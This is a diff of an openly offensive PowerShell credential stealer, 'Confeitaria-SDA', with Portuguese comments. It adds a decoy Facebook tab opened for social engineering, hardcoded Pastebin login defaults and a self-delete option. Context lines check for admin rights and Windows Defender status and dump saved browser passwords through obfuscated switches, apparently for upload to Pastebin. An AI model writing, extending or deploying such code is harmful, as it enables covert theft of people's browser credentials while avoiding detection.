@@ -25,6 +25,19 @@
    despercebida ao windows defender antivirus mas provalvelmente
    sera detectado se o alvo estiver outro antivirus instalado.
 
+.Parameter PasteBinUserName
+   PasteBin website username access (default: root-3xp10it)
+
+.Parameter PasteBinPassword
+   PasteBin website password access (default: angelapastebin)
+
+.Parameter URI
+   Open URL on a new web browser tab while executing the
+   rest of cmdlet code in background (social engineering)
+
+.Parameter AutoDelete
+   Auto-Delete this cmdlet in the end (default: true)
+
 .EXAMPLE
    Execute Confeitaria-SDA (execution visible)
    PS C:\> powershell -file Confeitaria-SDA.ps1
@@ -59,7 +72,7 @@
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
-   [string]$LOGFILE="${Env:TMP}\Confeitaria-SDA.txt",
+   [string]$URI="https://www.facebook.com/events/create/?acontext=%7B`"event_action_history`"%3A[%7B`"mechanism`"%3A`"left_rail`"%2C`"surface`"%3A`"bookmark`"%7D]%2C`"ref_notif_type`"%3Anull%7D&dialog_entry_point=bookmark",
    [string]$PasteBinPassword="angelapastebin",
    [string]$PasteBinUserName="pedro_testing",
    [string]$AutoDelete="true"
@@ -70,8 +83,9 @@ write-host ""
 $Ipath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 
-## Open|Start new web browser tab in Confeitaria-SDA webpage to fake a legit action
-Start "https://www.facebook.com/events/create/?acontext=%7B`"event_action_history`"%3A[%7B`"mechanism`"%3A`"left_rail`"%2C`"surface`"%3A`"bookmark`"%7D]%2C`"ref_notif_type`"%3Anull%7D&dialog_entry_point=bookmark"
+## Open|Start new web browser tab in
+# $URI webpage to fake a legit action
+Start "$URI"
 
 ## Make sure shell is running with administrator privileges before continue
 If([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544") -iNotMatch '^(True)$')
@@ -116,6 +130,7 @@ If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
 #>
 
 cd "$Env:TMP"
+$LOGFILE = "${Env:TMP}\Confeitaria-SDA.txt"
 $Current = (Get-Date -Format 'HH:mm:ss [dd/MM/yyyy]')
 write-host "[*] Dumping browsers credentials .." -ForegroundColor Green
 $CmdLine = "/Lo@adP@as@sw@or@dsI@E 1 /Lo@adPa@ss@wor@d@sFir@ef@ox 1 /Loa@dP@as@sw@or@ds@Ch@ro@m@e 1 /Lo@adPa@ss@wo@rd@sO@pe@ra 1 /Loa@dPa@ss@wo@rd@sS@af@ar@i 1" -replace '@',''
